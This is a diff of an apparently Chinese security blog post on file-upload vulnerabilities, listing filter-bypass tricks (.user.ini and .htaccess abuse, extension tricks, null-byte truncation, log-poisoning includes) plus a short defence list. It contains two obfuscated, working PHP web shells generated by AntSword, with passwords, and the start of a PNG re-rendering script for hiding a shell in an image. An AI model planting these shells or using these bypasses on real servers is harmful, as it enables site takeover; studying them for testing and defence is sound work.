@@ -5,9 +5,9 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="文件上传, Robin">
-    <meta name="description" content="概述文件上传漏洞可以分为以下几类：
+    <meta name="description" content="分类文件上传存在的漏洞一般有：
 类型限制绕过：Web应用程序对上传文件的类型进行限制，黑名单或白名单方式
-              攻击者可通过在请求包中伪造Content-Type字段或使用特定的文件扩展名的方式绕过限制，上传恶意文">
+              攻击者可通过在请求包中伪造Content-Type字段或使用特定的文件扩展名的方式绕过限制，上传恶意文件。">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -404,21 +404,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-04-18
+                    2023-07-07
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.8k
+                    1.9k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    8 分
+                    9 分
                 </div>
                 
 
@@ -438,7 +438,7 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>文件上传漏洞可以分为以下几类：</p>
+                <h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>文件上传存在的漏洞一般有：</p>
 <pre><code>类型限制绕过：Web应用程序对上传文件的类型进行限制，黑名单或白名单方式
               攻击者可通过在请求包中伪造Content-Type字段或使用特定的文件扩展名的方式绕过限制，上传恶意文件。
 
@@ -450,31 +450,34 @@
 
 二进制文件上传：攻击者上传二进制文件到服务器，通过漏洞执行恶意代码。
 </code></pre>
+<h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><p>操作木马文件提权 获取网站权限</p>
 <h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>burp抓包勤快点，多上传马，慢慢测试过滤规则，多积累木马。</p>
-<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><pre><code>
-【绕过前端检测】
-禁用JS
-更改前端文件
-更改文件后缀
-
-【后端校验文件类型】
-将Content-Type内容修改成image/png
-
-【后端检测文件后缀 · 黑名单】
-上传.user.ini        // auto_prepend_file = 1.jpg
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>【绕过前端检测】</p>
+<ol>
+<li>禁用JS</li>
+<li>更改前端文件</li>
+<li>更改文件后缀</li>
+</ol>
+<p>【后端校验文件类型】<br>将Content-Type内容修改成image/png</p>
+<p>【后端检测文件后缀 · 黑名单】</p>
+<pre><code>上传.user.ini        // auto_prepend_file = 1.jpg
 或者.htaccess        // AddType application/x-httpd-php .jpg
 上传木马并更改为合法后缀和文件类型
-
-【文件内容过滤】
-先使用二分法确定过滤了什么东西
-使用phP绕过对php的检测
-双写pphphp绕过
-末尾加.绕过
-末尾加空格绕过
-末尾加::&amp;DATA绕过
-%00截断上传
-0x00截断上传
-MINE绕过
+</code></pre>
+<p>【文件内容过滤】</p>
+<pre><code>先使用二分法确定过滤了什么东西
+1. 后缀名不完整 .php5 .phtml等绕过
+2. 在数据包中文件后缀名前加空格
+3. 使用phP绕过对php的检测
+4. 上传.htacess文件
+5. 末尾加上::$DATA
+6. 双写pphphp绕过
+7. 末尾加空格绕过
+8. 0x00截断上传
+9. 末尾加.绕过
+10. %00截断上传
+11. 后缀名前加.
+12. MINE绕过
 &lt;? echo &#39;123&#39;;?&gt;                               //short_open_tags=on
 &lt;?=(表达式)?&gt;  等价于 &lt;?php echo (表达式)?&gt;    //无限制
 &lt;% echo &#39;123&#39;;%&gt;                               //asp_tags=on php_version &lt; 7
@@ -482,51 +485,44 @@ MINE绕过
 可以用&#123;&#125;代替[]
 过滤了()，那就用反引号&#39;
 对log过滤了使用lo&quot;.&quot;g绕过
-
-【UA注入日志包含】
-上传完.user.ini        // auto_append_file=&quot;1.png&quot;
+</code></pre>
+<p>【未循环验证】<br>可以使用x.php..类似的方法</p>
+<p>【UA注入日志包含】</p>
+<pre><code>上传完.user.ini        // auto_append_file=&quot;1.png&quot;
 再上传图片             // &lt;?=include&quot;/var/log/nginx/access.log&quot;?&gt;
 访问网站然后修改ua头信息
-
-【文件头检测】
-增加对应的文件头
+</code></pre>
+<p>【文件头检测】</p>
+<pre><code>增加对应的文件头
 GIF文件:  GIF89A
 PNG文件:  89 50 4E 47 0D 0A 1A 0A
-
-【远程包含文件】
-使用  https://www.bejson.com/convert/ip2int/  将IP转换为纯数字
+</code></pre>
+<p>【远程包含文件】</p>
+<pre><code>使用  https://www.bejson.com/convert/ip2int/  将IP转换为纯数字
 &lt;?=include&#39;http://IP转换/&#39;&gt;
-
-【条件竞争】
-session包含，前文已经详细写过，不再重复描述。
-
-【图片二次渲染】
-将木马插入到图片中，类似于图片马
-脚本放在文末
-
-【getimagesize 绕过】
-getimagesize() 获取上传文件信息，图片马绕过
-
-【exif_imagetype 绕过】
-getimagesize() 获取上传文件信息，图片马绕过
-
-【文件大小检测】
-拒绝传入太小或太大的文件，控制文件大小，建议使用图片马
-
-【Apache陌生后缀解析漏洞】
-Apache认为一个文件可以拥有多个扩展名，哪怕没有文件名，也可以拥有多个扩展名。
-Apache认为应该从右到左开始判断解析方法的。
-如果最右侧的扩展名为不可识别的，就继续往左判断，直到判断到文件名为止。
-
-【蚁剑生成shell脚本】
-      // 连接密码: 123
+</code></pre>
+<p>【条件竞争】<br>session包含，前文已经详细写过，不再重复描述。</p>
+<p>【图片二次渲染】<br>将木马插入到图片中，类似于图片马<br>脚本放在文末</p>
+<p>【getimagesize 绕过】<br>getimagesize() 获取上传文件信息，图片马绕过</p>
+<p>【exif_imagetype 绕过】<br>getimagesize() 获取上传文件信息，图片马绕过</p>
+<p>【文件大小检测】<br>拒绝传入太小或太大的文件，控制文件大小，建议使用图片马</p>
+<p>【Apache陌生后缀解析漏洞】<br>Apache认为一个文件可以拥有多个扩展名，哪怕没有文件名，也可以拥有多个扩展名。<br>Apache认为应该从右到左开始判断解析方法的。<br>如果最右侧的扩展名为不可识别的，就继续往左判断，直到判断到文件名为止。</p>
+<h4 id="防护方案"><a href="#防护方案" class="headerlink" title="防护方案"></a>防护方案</h4><ol>
+<li>后端验证：采用服务端验证模式</li>
+<li>后缀验证：基于白名单，黑名单过滤</li>
+<li>MIME验证：基于上传自带类型艰检测</li>
+<li>内容检测：文件头，完整性检测</li>
+<li>自带函数过滤</li>
+<li>WAF防护软件：宝塔、云盾等</li>
+</ol>
+<p>蚁剑生成的shell脚本</p>
+<pre><code>      // 连接密码: 123
 &lt;?php $qdjZ=create_function(chr(0x1cf-0x1ab).str_rot13(&#39;f&#39;).chr(0x15009/0x307).chr(228-119).str_rot13(&#39;r&#39;),base64_decode(&#39;ZQ==&#39;).chr(104076/882).str_rot13(&#39;n&#39;).chr(651-543).chr(01545-01475).base64_decode(&#39;JA==&#39;).chr(90045/783).chr(0xca0e/0x1d2).str_rot13(&#39;z&#39;).chr(810-709).str_rot13(&#39;)&#39;).chr(29028/492));$qdjZ(base64_decode(&#39;Njc5M&#39;.&#39;jMzO0&#39;.&#39;BldkF&#39;.&#39;sKCRf&#39;.&#39;&#39;.base64_decode(&#39;VQ==&#39;).base64_decode(&#39;RQ==&#39;).str_rot13(&#39;9&#39;).chr(0xbe50/0x244).chr(390-304).&#39;&#39;.&#39;&#39;.str_rot13(&#39;S&#39;).chr(0157503/0761).str_rot13(&#39;k&#39;).base64_decode(&#39;TQ==&#39;).chr(01077-0725).&#39;&#39;.&#39;NdKTs&#39;.&#39;yMDM3&#39;.&#39;Njk5O&#39;.&#39;w==&#39;.&#39;&#39;));?&gt;
       // 连接密码: TyKPuntU
 &lt;?php $bFIY=create_function(chr(25380/705).chr(92115/801).base64_decode(&#39;bw==&#39;).base64_decode(&#39;bQ==&#39;).base64_decode(&#39;ZQ==&#39;),chr(0x16964/0x394).chr(0x6f16/0xf1).base64_decode(&#39;YQ==&#39;).base64_decode(&#39;bA==&#39;).chr(060340/01154).chr(01041-0775).base64_decode(&#39;cw==&#39;).str_rot13(&#39;b&#39;).chr(01504-01327).base64_decode(&#39;ZQ==&#39;).chr(057176/01116).chr(0xe3b4/0x3dc));$bFIY(base64_decode(&#39;NjgxO&#39;.&#39;Tc7QG&#39;.&#39;V2QWw&#39;.&#39;oJF9Q&#39;.&#39;&#39;.str_rot13(&#39;G&#39;).str_rot13(&#39;1&#39;).str_rot13(&#39;A&#39;).base64_decode(&#39;VQ==&#39;).str_rot13(&#39;J&#39;).&#39;&#39;.&#39;&#39;.chr(0x304-0x2d3).base64_decode(&#39;Ug==&#39;).chr(13197/249).str_rot13(&#39;F&#39;).base64_decode(&#39;MQ==&#39;).&#39;&#39;.&#39;B1bnR&#39;.&#39;VXSk7&#39;.&#39;MjA0N&#39;.&#39;TkxOw&#39;.&#39;==&#39;.&#39;&#39;));?&gt;
 </code></pre>
 <p>PNG二次渲染脚本</p>
-<pre><code>
-&lt;?php
+<pre><code>&lt;?php
 $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
            0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
            0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
@@ -1001,7 +997,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">88.9k</span>
+                        class="white-color">93.9k</span>
             
             
             
